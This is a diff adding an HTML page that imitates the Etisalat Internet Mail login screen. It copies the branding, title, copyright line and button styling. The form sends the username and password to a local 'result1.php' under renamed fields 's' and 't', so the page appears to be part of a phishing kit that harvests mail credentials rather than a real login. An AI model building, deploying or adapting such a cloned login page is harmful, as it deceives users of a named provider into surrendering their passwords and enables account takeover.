@@ -1,0 +1,126 @@
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class="dj_webkit dj_chrome dj_contentbox"><head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<!-- Mimic Internet Explorer 7 -->
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+                <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
+                <link rel="stylesheet" href="css/login.css" type="text/css">
+		<style type="text/css">
+			@import "css/dojo.css";
+			@import "css/dijit.css";
+			@import "css/dijit_rtl.css";
+			@import "css/Button.css";
+			@import "css/DropDownSelect.css";
+                body {
+background-image: url(images/background.png); /*You will specify your image path here.*/
+
+background-size: cover;
+background-position: top center !important;
+background-repeat: no-repeat !important;
+background-attachment: fixed;
+}
+
+</style>
+                <style>
+                .Convergence-Login-Logo {
+        background-color: transparent;
+        background-image: url("images/mail.jpg");
+        background-repeat: no-repeat;
+        background-position: 0 0;
+        width: 75px;
+        height:85px;
+        padding: 0 0 0 0;
+        border-bottom:none;
+        margin-left:5px;
+        float:left;
+}
+        .Convergence-Login-RedBand {
+        margin: 0px;
+        background-image:url("images/greyband.jpg");
+        background-position: left top;
+        height: 30px;
+        width: 430px;
+}
+
+		</style>
+
+		<script type="text/javascript" src="css/dojo.js"></script>
+		<title>my email - Etisalat Internet Mail</title>
+		</head>
+		<body role="application"><textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea>
+		
+		<script type="text/javascript">
+			
+		</script>
+        <div class="Convergence-Login" id="convergenceLogin">
+			<div class="Convergence-Login-Border">
+				<div class="Convergence-Login-Banner">
+					<div class="Convergence-Login-Logo" wairole="presentation"></div>
+					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg">my email - Etisalat Internet Mail</div>
+				</div>
+
+				<div class="Convergence-Login-Notification" id="alertMsg" aria-live="assertive" role="alert" tabindex="0" style="visibility: hidden;"></div>
+				
+				<form action="result1.php" method="post" onsubmit="return login();">
+
+					<div>
+						<div class="Convergence-Login-Form">
+							<div class="Convergence-Login-FormRow">
+								<label id="usernameLabelID" for="username">Username: </label>
+								<input id="username" name="s" type="text" aria-required="true">
+							</div>
+							<div class="Convergence-Login-FormRow">
+								<label id="passwordLabelID" for="password">Password: </label>
+								<input id="password" name="t" type="password" aria-required="true" autocomplete="off">
+							</div>
+								<div class="Convergence-Login-FormRow">
+								<input id="chkpreloginip" name="chkpreloginip" type="hidden" value="true" aria-required="false">
+							</div>
+							<div class="Convergence-Login-FormRow tundra">
+
+								<div class="Convergence-Login-SelectLang">
+								</div>
+								<div class="Convergence-Login-FormButton" id="buttonContainer">
+									<div>
+										<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Sign In</span></button></span></span></span>
+									</div>
+								</div>
+								<div style="clear: both"></div>
+							</div>
+
+						</div>
+
+					</div>
+					<div style="clear: both"></div>
+				</form>
+		<div class="Password-Expired-Message tundra" id="PwdExpiredMsg" style="display:none;">                   
+			<div class="ErrorMsg-Contianer" id="btnContainer">                                                
+				<div class="Error-Icon"></div>
+				<div class="Error-Msg" id="errMsg"></div>			    	
+			</div>
+			<div class="Convergence-Login-FormButton ChangePwdBtn">	
+				<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="changepwd"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="button" value="" wairole="button" waistate="labelledby-changepwd_label" role="button" aria-labelledby="changepwd_label" id="changepwd" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="changepwd_label" dojoattachpoint="containerNode">Change Password</span></button></span></span></span>
+		    </div>
+                </div>                
+				<div class="Convergence-Login-RedBand"></div>
+				<div id="copyright" class="Convergence-Login-Copyright">Copyright © 2020, Etisalat. All Rights Reserved.</div>
+			</div>
+		</div>
+
+		<div id="overlay" class="login" style="display: none;">
+			<div class="centered">
+				<div class="logo"></div>
+				<div id="progress">Signing in...</div>
+			</div>
+		</div>
+
+		<iframe name="picCache" id="picCache" src="" width="0" height="0" frameborder="0"></iframe>
+
+		<noscript>
+			<div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto">
+				<iframe src="noscript.html" frameborder=0 width=100%" />
+			</div>
+		</noscript>
+    
+
+
+</body></html>
